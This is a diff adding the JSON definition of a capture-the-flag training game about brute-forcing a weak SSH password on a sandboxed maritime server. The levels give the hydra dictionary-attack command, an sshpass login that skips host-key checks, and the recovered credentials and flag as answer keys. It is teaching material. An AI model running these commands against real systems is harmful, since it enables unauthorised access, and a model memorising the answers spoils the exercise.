@@ -1,0 +1,193 @@
+{
+  "title": "SSH Weak Password — Halcyon Marine",
+  "description": "Recover a weak SSH password with a dictionary attack against a maritime logistics server, log in as the dockyard operator, and retrieve the hidden flag.",
+  "prerequisites": [],
+  "outcomes": [
+    "Explain why password authentication over SSH is dangerous when weak passwords are allowed.",
+    "Use a wordlist and hydra to perform an online dictionary attack against an SSH service.",
+    "Authenticate with recovered credentials and retrieve sensitive files from a remote host."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 35,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, **Halcyon Marine Systems**, runs a fleet-management server that dockyard staff reach over SSH. During onboarding you overheard a crew member say passwords are \"just the season and the year — easy to remember\".\n\nThat is exactly the kind of habit that sinks ships. Your task: prove the operator account can be broken with an ordinary dictionary attack, log in, and recover the manifest flag."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to your attacker machine at **10.1.32.23**. Your target is the Halcyon Marine server at **10.1.32.10** (SSH port 22).\n\nConfirm the service is reachable:\n\n```\nnc -zv 10.1.32.10 22\n```\n\nDo not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "The target SSH service is running locally on port **2222**:\n\n```\nnc -zv 127.0.0.1 2222\n```\n\nSubmit **start** to begin."
+    },
+    {
+      "title": "Enumerate the Target Account",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "deckhand",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Before brute forcing, you need a valid username to target. Client reconnaissance (a LinkedIn page and a leaked support ticket) both reference the shared **dockyard operator** account.\n\nHalcyon Marine's naming convention for that role is a single lowercase word describing a junior crew member who works on deck.\n\nThe SSH banner and role documentation both point to the same account name. Password authentication is enabled on the server, which means this account can be attacked with a dictionary.\n\n**What is the username of the dockyard operator account you will target?**",
+      "solution": "Reconnaissance of the client's role documentation reveals the shared dockyard operator account is named **deckhand**. This is the account you will brute force in the next level.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What kind of crew member is it?",
+          "content": "A junior crew member who works on the deck of a ship. The account name is a single lowercase word — the common English term for that role.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "The exact word",
+          "content": "The account is named `deckhand`.",
+          "hint_penalty": 2,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1087" }
+      ]
+    },
+    {
+      "title": "Crack the Password with Hydra",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 12,
+      "answer": "Sailor2024",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have a valid username (`deckhand`) and a wordlist of common maritime passwords (`crew-passwords.txt`, already on your attacker machine — or build your own).\n\nRun an online dictionary attack against the SSH service with **hydra**:\n\n```\nhydra -l deckhand -P crew-passwords.txt ssh://10.1.32.10\n```\n\nHydra tries each password in the list until one authenticates. Because the operator chose a weak, guessable password that appears in the list, the attack succeeds in seconds.\n\nWatch for the line that reports a valid `login:` / `password:` pair.\n\n**What password does hydra recover for the `deckhand` account?**",
+      "solution": "```\n$ hydra -l deckhand -P crew-passwords.txt ssh://10.1.32.10\n...\n[22][ssh] host: 10.1.32.10   login: deckhand   password: Sailor2024\n1 of 1 target successfully completed, 1 valid password found\n```\n\nThe recovered password is **Sailor2024** — a season-and-year password exactly as the crew member described.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What is the hydra syntax?",
+          "content": "Use `-l` for a single login name and `-P` for a password list file: `hydra -l deckhand -P crew-passwords.txt ssh://<target-ip>`.",
+          "hint_penalty": 3,
+          "order": 0
+        },
+        {
+          "title": "Where is the wordlist?",
+          "content": "A ready-made wordlist `crew-passwords.txt` is available. If you cannot find it, any common-password list will work — the operator's password follows the pattern <Season><Year>.",
+          "hint_penalty": 4,
+          "order": 1
+        },
+        {
+          "title": "The password pattern",
+          "content": "The password combines a maritime crew word with the current year and a capital first letter: `Sailor2024`.",
+          "hint_penalty": 5,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 25,
+      "mitre_techniques": [
+        { "technique_key": "TA0006.T1110.001" }
+      ]
+    },
+    {
+      "title": "Log In and Retrieve the Manifest",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 5,
+      "answer": "WMG{w3ak_ssh_cr3ds_s1nk_sh1ps}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have working credentials: `deckhand` / `Sailor2024`. Use them to log in over SSH and read the flag from the operator's home directory.\n\n```\nssh deckhand@10.1.32.10\n# enter the password when prompted\ncat ~/manifest.txt\n```\n\nOr do it in a single command:\n\n```\nsshpass -p 'Sailor2024' ssh -o StrictHostKeyChecking=no deckhand@10.1.32.10 'cat ~/manifest.txt'\n```\n\nIn a real engagement, this shared operator account would give you a foothold to pivot deeper into the fleet-management network.\n\n**Submit the flag stored in `manifest.txt`.**",
+      "solution": "```\n$ sshpass -p 'Sailor2024' ssh -o StrictHostKeyChecking=no deckhand@10.1.32.10 'cat ~/manifest.txt'\nWMG{w3ak_ssh_cr3ds_s1nk_sh1ps}\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where is the flag?",
+          "content": "Log in as `deckhand` and read `~/manifest.txt` — the flag is the only line in that file.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What format is the flag?",
+          "content": "The flag starts with `WMG{` and ends with `}`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1078.001" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Please answer these questions to help us improve the game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult did you find this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Before this game, had you used hydra for password attacks?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, regularly", "correct": true, "order": 0 },
+            { "text": "I had heard of it but not used it", "correct": true, "order": 1 },
+            { "text": "No, this was completely new", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How clear were the level instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",         "correct": true, "order": 0 },
+            { "text": "Mostly clear",        "correct": true, "order": 1 },
+            { "text": "Confusing at times",  "correct": true, "order": 2 },
+            { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you change or add to improve this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
